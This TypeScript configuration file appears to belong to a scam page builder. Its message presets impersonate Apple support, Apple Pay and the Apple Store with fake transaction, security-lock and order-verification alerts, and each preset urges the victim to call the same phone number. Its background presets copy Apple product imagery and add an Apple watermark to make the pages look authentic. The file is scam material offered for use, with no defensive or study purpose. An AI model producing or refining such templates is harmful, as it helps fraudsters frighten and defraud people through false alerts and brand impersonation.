import type { BrandLogoType, BackgroundType, BackgroundTheme } from '../types/config';

export interface MessagePreset {
  id: string;
  name: string;
  badge: string;
  icon: BrandLogoType;
  brandName: string;
  popupHeading: string;
  popupDescription: string;
  notificationCategory: string;
  notificationTitle: string;
  notificationMessage: string;
}

export const MESSAGE_PRESETS: MessagePreset[] = [
  {
    id: 'customer-support',
    name: 'Customer Support',
    badge: 'Official Care',
    icon: 'apple',
    brandName: 'Customer Support',
    popupHeading: 'CUSTOMER ASSISTANCE',
    popupDescription:
      'Welcome to Customer Support. Our verified product specialists are available 24/7 to assist you with order status, device setup, warranty information, and Apple Pay assistance. Please choose an option below to connect with our official support team.',
    notificationCategory: 'Messages',
    notificationTitle: 'Customer Care & Assistance',
    notificationMessage:
      'Need assistance with your Apple Pay setup, product inquiries, or order support? Call +1 (800) 692-7753',
  },
  {
    id: 'apple-pay',
    name: 'Apple Pay Verification',
    badge: 'Payment',
    icon: 'messages',
    brandName: 'Apple Pay Services',
    popupHeading: 'PAYMENT VERIFICATION',
    popupDescription:
      'An authorization alert was recorded for your Apple Pay card. If this transaction was not initiated by you or requires manual verification, please contact our support desk immediately to safeguard your account.',
    notificationCategory: 'Wallet & Apple Pay',
    notificationTitle: 'Authorization Requested',
    notificationMessage:
      'Apple Pay transaction flagged for security verification. Please contact support at +1 (800) 692-7753.',
  },
  {
    id: 'security-alert',
    name: 'Security & Lock Advisory',
    badge: 'Security',
    icon: 'shield',
    brandName: 'Security & Verification',
    popupHeading: 'SECURITY LOCK ADVISORY',
    popupDescription:
      'Unusual sign-in activity was detected on your registered device. For your protection, temporary restrictions have been placed. Connect with official customer care to verify your credentials.',
    notificationCategory: 'System Security',
    notificationTitle: 'Security Verification Required',
    notificationMessage:
      'Temporary security lock applied. Verify your account immediately by calling +1 (800) 692-7753.',
  },
  {
    id: 'order-care',
    name: 'Order & Hardware Care',
    badge: 'Orders',
    icon: 'support',
    brandName: 'Apple Store Orders',
    popupHeading: 'ORDER STATUS ASSISTANCE',
    popupDescription:
      'Your recent equipment order is awaiting dispatch verification. For questions concerning shipping address, trade-in value, or delivery times, connect directly with our specialist hotline.',
    notificationCategory: 'Apple Store',
    notificationTitle: 'Order Verification Update',
    notificationMessage:
      'Your order dispatch requires quick confirmation. Call our representative at +1 (800) 692-7753.',
  },
];

export interface BackgroundSetupPreset {
  id: string;
  name: string;
  badge: string;
  type: BackgroundType;
  theme: BackgroundTheme;
  customImageUrl?: string;
  description: string;
}

export const BACKGROUND_PRESETS: BackgroundSetupPreset[] = [
  {
    id: 'apple-grid',
    name: '4-Product Grid',
    badge: 'Screenshot Classic',
    type: 'grid',
    theme: 'light',
    description: 'Clean 2×2 showcase with iPhone, Mac, iPad, and Watch tiles',
  },
  {
    id: 'hero-device',
    name: 'Centered Hero Showcase',
    badge: 'Minimal Pro',
    type: 'hero',
    theme: 'light',
    description: 'Focused hero device centered in the viewport with ambient glow',
  },
  {
    id: 'studio-clean',
    name: 'Studio Minimalist',
    badge: 'Studio Gray',
    type: 'minimal',
    theme: 'studio',
    description: 'Clean silver-gray studio backdrop with subtle Apple watermark',
  },
  {
    id: 'dark-titanium',
    name: 'Dark Titanium Mode',
    badge: 'Dark Luxury',
    type: 'grid',
    theme: 'dark',
    description: 'High-contrast dark titanium background for dramatic focus',
  },
];
